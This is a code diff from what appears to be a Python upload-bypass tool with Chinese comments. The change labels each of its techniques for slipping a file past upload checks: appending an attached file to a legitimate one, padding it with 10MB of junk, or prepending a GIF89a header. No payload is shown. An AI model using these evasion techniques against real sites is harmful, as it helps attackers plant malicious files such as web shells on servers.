@@ -199,7 +199,8 @@ class General:
         if Files != []:
             print(blue('[ schedule ]') + cyan('尝试以内容混淆绕过检测'))
             for f in Files:
-                res = self.Comman.upload(self.args.u, f, self.data)
+                print(blue('[ Info ]') + fuchsia('绕过姿势:') + cyan(f['Desc']))
+                res = self.Comman.upload(self.args.u, f['files'], self.data)
                 check = self.Comman.checkResult(self.initUrls, res)
                 self.end(check=check, stop=self.stop)
         return
@@ -225,14 +226,20 @@ class General:
                 self.p_ct
             )
             }
-            Files.append(files.copy())
+            Files.append({
+                'files': files.copy(),
+                'Desc': '文件内容合并1'
+            })
             files = {
                 field: (
                     file,  # 文件名使用file的
                     open(file, 'rb').read() + open(attach, 'rb').read()  # attach内容附加在file后
                 )
             }
-            Files.append(files.copy())
+            Files.append({
+                'files': files.copy(),
+                'Desc': '文件内容合并2'
+            })
         except:
             print(red('[ Error ]') + yellow('合并文件失败'))
         try:
@@ -244,14 +251,20 @@ class General:
                     self.p_ct
                 )
             }
-            Files.append(files.copy())
+            Files.append({
+                'files': files.copy(),
+                'Desc': '10MB垃圾内容填充1'
+            })
             files = {
                 field: (
                     file,  # 文件名使用file的
                     ran_str.encode() + open(attach, 'rb').read()
                 )
             }
-            Files.append(files.copy())
+            Files.append({
+                'files': files.copy(),
+                'Desc': '10MB垃圾内容填充2'
+            })
         except:
             print(red('[ Error ]') + yellow('垃圾内容填充失败'))
         try:
@@ -261,7 +274,10 @@ class General:
                 'GIF89a'.encode() + open(attach, 'rb').read()  # 添加文件头
             )
             }
-            Files.append(files.copy())
+            Files.append({
+                'files': files.copy(),
+                'Desc': '添加合法文件头'
+            })
         except:
             print(red('[ Error ]') + yellow('添加文件头失败'))
         return Files
